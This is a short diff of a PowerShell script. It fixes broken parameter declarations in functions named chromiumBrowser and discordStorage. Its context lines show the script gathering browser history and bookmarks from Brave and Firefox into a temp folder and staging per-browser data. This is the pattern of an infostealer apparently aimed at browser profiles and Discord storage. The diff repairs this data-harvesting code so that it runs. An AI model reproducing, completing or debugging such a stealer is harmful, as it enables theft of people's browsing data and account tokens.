@@ -591,12 +591,13 @@ Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FolderName\B
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
 function chromiumBrowser {
+	
 	[CmdletBinding()]
 	param (
 	[Parameter (Position=1,Mandatory = $True)]
-	[String]$Path,
-	(Parameter (Position=1,Mandatory = $True)]
-	[String]$Browser
+	[string]$Path, 
+	[Parameter (Position=1,Mandatory = $True)]
+	[string]$Browser
 	)
 
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
@@ -678,9 +679,9 @@ function discordStorage {
 	[CmdletBinding()]
 	param (
 	[Parameter (Position=1,Mandatory = $True)]
-	[String]$Path,
-	(Parameter (Position=1,Mandatory = $True)]
-	[String]$Browser
+	[string]$Path,
+	[Parameter (Position=1,Mandatory = $True)]
+	[string]$Browser
 	)
 
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
